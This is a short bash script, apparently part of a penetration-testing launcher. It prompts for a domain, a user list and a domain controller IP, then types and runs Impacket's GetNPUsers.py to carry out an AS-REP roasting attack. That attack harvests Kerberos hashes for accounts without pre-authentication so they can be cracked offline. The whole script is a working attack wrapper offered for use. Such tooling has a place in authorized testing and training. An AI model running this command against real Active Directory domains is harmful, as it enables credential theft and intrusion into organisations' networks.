#!/bin/bash

: '
do an asreproast attack
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERS_FILE_FIELD=$(form_item  "users file" "users_file")
DC_IP_FIELD=$(form_item  "DC ip" "dc_ip")

# Generate GUI form
generate_form "${DOMAIN_FIELD}" "${USERS_FILE_FIELD}" "${DC_IP_FIELD}"

DOMAIN=${form_data["domain"]}
USERS_FILE=${form_data["users_file"]}
DC_IP=${form_data["dc_ip"]}

paste_command "GetNPUsers.py ${DOMAIN}/ -dc-ip ${DC_IP} -no-pass -usersfile ${USERS_FILE}"
xdotool key Return
